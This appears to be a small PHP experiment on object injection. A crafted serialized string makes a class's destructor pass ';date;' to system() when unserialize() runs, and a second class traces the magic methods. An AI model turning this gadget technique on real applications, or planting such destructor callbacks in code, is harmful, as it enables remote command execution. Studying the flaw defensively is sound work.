<?php

class DestructTracerNode {
  private $callback;
  private $tag;

  public function __construct( $callback, $tag ) {
    $this->callback = $callback;
    $this->tag = $tag;
  }

  public function __destruct() {
    call_user_func( $this->callback, "[Destruct] {$this->tag}" );
  }
}


$s = 'O:18:"DestructTracerNode":2:{s:28:"'."\0".'DestructTracerNode'."\0".'callback";s:6:"system";s:23:"'."\0".'DestructTracerNode'."\0".'tag";s:6:";date;";}';
$o = unserialize($s);



/*
$o = new DestructTracerNode("aaa","bb");
$s = serialize($o);
var_dump($s);
*/


class Test {
  public $asdf;
  public $xyz;

  function __construct() {
    echo "__construct\n";
  }

  function __destruct() {
    echo "__destruct\n";
    echo $this->asdf . "\n";
    echo $this->xyz . "\n";
  }

  public function __wakeup() {
    echo "__wakeup\n";
    $this->asdf = "";
    echo $this->asdf . "\n";
    echo $this->xyz . "\n";

  }

}

/*$t = new Test();
$t->asdf = "asdf";
$t->xyz = "xyz";
$s = serialize($t);
echo $s . "\n";

$o = unserialize($s);
var_dump($o);

*/

